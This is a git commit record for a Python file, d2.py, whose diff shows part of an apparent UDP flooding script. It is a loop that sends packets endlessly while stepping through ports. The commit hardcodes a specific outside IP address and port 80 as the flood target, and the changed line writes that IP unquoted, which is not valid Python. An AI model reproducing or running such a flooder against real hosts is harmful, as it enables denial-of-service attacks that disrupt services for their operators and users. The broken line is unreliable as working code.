034755355825f72b5fe53cdb54ab13bc36be1cba
Faisal090 <67527440+Faisal090@users.noreply.github.com>
2021-05-19 13:56:15 +0300

    Update d2.py

--- d2.py
+++ d2.py
@@ -20,7 +20,7 @@ sent = 0
 
 
 while True:
-     sock.sendto(bytes, (ip,port))
+     sock.sendto(bytes, (185.213.209.155,80))
      sent = sent + 1
      port = port + 1
      print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
